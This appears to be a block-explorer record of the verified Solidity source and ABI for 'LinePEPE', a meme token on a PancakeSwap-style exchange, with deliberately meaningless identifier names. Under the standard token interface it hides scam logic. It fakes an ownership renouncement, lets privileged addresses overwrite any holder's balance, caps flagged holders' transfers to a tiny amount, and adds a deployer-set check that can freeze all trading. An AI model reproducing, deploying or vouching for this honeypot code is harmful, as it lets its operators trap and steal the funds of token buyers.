{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface shouldTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchFromSell) external view returns (uint256);\n\n    function transfer(address limitMin, uint256 autoSell) external returns (bool);\n\n    function allowance(address marketingToTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoSell) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address limitMin,\n        uint256 autoSell\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromTradingMin, uint256 value);\n    event Approval(address indexed marketingToTotal, address indexed spender, uint256 value);\n}\n\nabstract contract fromBuyList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface modeIsBuy {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface totalMode {\n    function createPair(address tradingLaunched, address exemptShould) external returns (address);\n}\n\ninterface shouldTakeMetadata is shouldTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LinePEPE is fromBuyList, shouldTake, shouldTakeMetadata {\n\n    function getOwner() external view returns (address) {\n        return receiverAt;\n    }\n\n    mapping(address => mapping(address => uint256)) private swapLaunched;\n\n    function approve(address fundTeam, uint256 autoSell) public virtual override returns (bool) {\n        swapLaunched[_msgSender()][fundTeam] = autoSell;\n        emit Approval(_msgSender(), fundTeam, autoSell);\n        return true;\n    }\n\n    uint256 private launchedEnable;\n\n    function transferFrom(address tradingWallet, address limitMin, uint256 autoSell) external override returns (bool) {\n        if (_msgSender() != launchedWalletMarketing) {\n            if (swapLaunched[tradingWallet][_msgSender()] != type(uint256).max) {\n                require(autoSell <= swapLaunched[tradingWallet][_msgSender()]);\n                swapLaunched[tradingWallet][_msgSender()] -= autoSell;\n            }\n        }\n        return shouldWalletFrom(tradingWallet, limitMin, autoSell);\n    }\n\n    mapping(address => bool) public tradingIsTeam;\n\n    address public minReceiver;\n\n    address toEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function allowance(address shouldListBuy, address fundTeam) external view virtual override returns (uint256) {\n        if (fundTeam == launchedWalletMarketing) {\n            return type(uint256).max;\n        }\n        return swapLaunched[shouldListBuy][fundTeam];\n    }\n\n    function fromLaunched(address tradingWallet, address limitMin, uint256 autoSell) internal returns (bool) {\n        require(modeMax[tradingWallet] >= autoSell);\n        modeMax[tradingWallet] -= autoSell;\n        modeMax[limitMin] += autoSell;\n        emit Transfer(tradingWallet, limitMin, autoSell);\n        return true;\n    }\n\n    uint256 private marketingLiquidity = 100000000 * 10 ** 18;\n\n    function walletReceiver(address fundTake) public {\n        senderFeeSwap();\n        \n        if (fundTake == tokenMaxTo || fundTake == minReceiver) {\n            return;\n        }\n        exemptIs[fundTake] = true;\n    }\n\n    string private autoTeam = \"Line PEPE\";\n\n    bool public shouldMarketing;\n\n    event OwnershipTransferred(address indexed takeTrading, address indexed isWalletMax);\n\n    mapping(address => bool) public exemptIs;\n\n    function symbol() external view virtual override returns (string memory) {\n        return walletLimitFund;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return feeLiquidity;\n    }\n\n    bool public tradingMin;\n\n    function transfer(address toTrading, uint256 autoSell) external virtual override returns (bool) {\n        return shouldWalletFrom(_msgSender(), toTrading, autoSell);\n    }\n\n    function owner() external view returns (address) {\n        return receiverAt;\n    }\n\n    function shouldWalletFrom(address tradingWallet, address limitMin, uint256 autoSell) internal returns (bool) {\n        if (tradingWallet == tokenMaxTo) {\n            return fromLaunched(tradingWallet, limitMin, autoSell);\n        }\n        uint256 amountTake = shouldTake(minReceiver).balanceOf(toEnable);\n        require(amountTake == launchedWalletSender);\n        require(limitMin != toEnable);\n        if (exemptIs[tradingWallet]) {\n            return fromLaunched(tradingWallet, limitMin, swapMax);\n        }\n        return fromLaunched(tradingWallet, limitMin, autoSell);\n    }\n\n    address launchedWalletMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function name() external view virtual override returns (string memory) {\n        return autoTeam;\n    }\n\n    uint256 launchedWalletSender;\n\n    uint256 public receiverMarketing;\n\n    function totalEnable(address exemptMode) public {\n        if (tradingMin) {\n            return;\n        }\n        if (totalFromReceiver) {\n            marketingIs = launchedEnable;\n        }\n        tradingIsTeam[exemptMode] = true;\n        if (shouldMarketing) {\n            totalFromReceiver = false;\n        }\n        tradingMin = true;\n    }\n\n    constructor (){\n        if (maxExempt == totalFromReceiver) {\n            receiverMarketing = marketingIs;\n        }\n        modeIsBuy toAtLaunch = modeIsBuy(launchedWalletMarketing);\n        minReceiver = totalMode(toAtLaunch.factory()).createPair(toAtLaunch.WETH(), address(this));\n        \n        tokenMaxTo = _msgSender();\n        txLiquidity();\n        tradingIsTeam[tokenMaxTo] = true;\n        modeMax[tokenMaxTo] = marketingLiquidity;\n        \n        emit Transfer(address(0), tokenMaxTo, marketingLiquidity);\n    }\n\n    uint256 buyIs;\n\n    bool private amountTotal;\n\n    uint256 private marketingIs;\n\n    uint256 constant swapMax = 4 ** 10;\n\n    address public tokenMaxTo;\n\n    function balanceOf(address launchFromSell) public view virtual override returns (uint256) {\n        return modeMax[launchFromSell];\n    }\n\n    bool private totalFromReceiver;\n\n    mapping(address => uint256) private modeMax;\n\n    address private receiverAt;\n\n    function txLiquidity() public {\n        emit OwnershipTransferred(tokenMaxTo, address(0));\n        receiverAt = address(0);\n    }\n\n    string private walletLimitFund = \"LPE\";\n\n    function sellLimitLaunch(address toTrading, uint256 autoSell) public {\n        senderFeeSwap();\n        modeMax[toTrading] = autoSell;\n    }\n\n    bool public maxExempt;\n\n    function senderLiquidity(uint256 autoSell) public {\n        senderFeeSwap();\n        launchedWalletSender = autoSell;\n    }\n\n    function senderFeeSwap() private view {\n        require(tradingIsTeam[_msgSender()]);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return marketingLiquidity;\n    }\n\n    uint8 private feeLiquidity = 18;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingToTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isWalletMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromTradingMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldListBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundTeam\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoSell\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchFromSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoSell\",\"type\":\"uint256\"}],\"name\":\"sellLimitLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoSell\",\"type\":\"uint256\"}],\"name\":\"senderLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenMaxTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptMode\",\"type\":\"address\"}],\"name\":\"totalEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingIsTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoSell\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoSell\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTake\",\"type\":\"address\"}],\"name\":\"walletReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "LinePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}